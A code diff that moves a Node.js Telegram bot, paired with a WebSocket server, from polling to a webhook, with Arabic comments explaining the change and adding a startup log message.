@@ -14,7 +14,10 @@ const address = 'https://www.google.com';
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
-const bot = new TelegramBot(token, { polling: true });
+
+// ⭐ الحل: استخدام Webhook بدلاً من Polling
+const bot = new TelegramBot(token);
+
 const clients = new Map();
 const upload = multer();
 
@@ -77,6 +80,7 @@ wss.on('connection', (ws, req) => {
     });
 });
 
+// ⭐ معالجة رسائل البوت عبر Webhook
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     
@@ -537,7 +541,17 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-// ⭐ تم إصلاح المشكلة: إزالة الـ setInterval الذي كان يسبب إرسال رسائل مستمرة
-// بدلاً من ذلك يمكن استخدام ping فقط عند الحاجة
+// ⭐ إضافة Webhook route
+app.post(`/bot${token}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
 
-server.listen(process.env.PORT || 8999);
+// ⭐ تعيين Webhook عند التشغيل
+bot.setWebHook(`https://bot-d4k2.onrender.com/bot${token}`)
+    .then(() => console.log('Webhook set successfully'))
+    .catch(err => console.error('Error setting webhook:', err));
+
+server.listen(process.env.PORT || 8999, () => {
+    console.log('Server is running on port', process.env.PORT || 8999);
+});
